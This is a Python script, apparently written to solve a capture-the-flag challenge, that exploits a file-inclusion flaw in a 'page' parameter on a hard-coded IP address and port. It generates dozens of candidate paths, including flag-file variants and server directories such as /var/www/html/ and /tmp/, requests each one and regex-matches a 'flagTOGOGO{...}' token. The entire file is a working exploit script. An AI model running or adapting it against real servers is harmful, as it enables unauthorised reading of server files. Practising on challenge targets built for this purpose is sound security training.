#!/usr/bin/env python3
"""
RFI最终扫描 - 系统地测试所有可能的flag位置
"""

import requests
import re
import sys

target = "http://47.113.178.182:32827/"

# 生成所有可能的flag路径
paths = []

# 根目录flag变体
for prefix in ['/', '']:
    for name in ['flag', 'Flag', 'FLAG', 'fl4g', 'f1ag', 'flaggg', 'flagaa', 'flag_']:
        for suffix in ['', '.txt', '.php', '.html', '_rfi', '_remote', 'ggg']:
            if prefix == '' and name.startswith('/'):
                continue
            paths.append(prefix + name + suffix)

# 其他目录
for dir in ['/tmp/', '/var/www/', '/var/www/html/', 'docs/']:
    for name in ['flag', 'flag.txt', 'secret.txt']:
        paths.append(dir + name)

print(f"[*] 测试 {len(paths)} 个路径...")

for i, path in enumerate(paths):
    if (i + 1) % 50 == 0:
        print(f"[*] 已测试: {i+1}/{len(paths)}")

    try:
        r = requests.get(target, params={'page': path}, timeout=3)

        if 'flagTOGOGO{' in r.text:
            print(f"\n[+] 找到FLAG!")
            print(f"[+] 路径: {path}")
            flags = re.findall(r'flagTOGOGO\{[^}]+\}', r.text)
            if flags:
                print(f"[+] FLAG: {flags[0]}")
                sys.exit(0)

    except:
        pass

print("\n[!] 未找到flag")
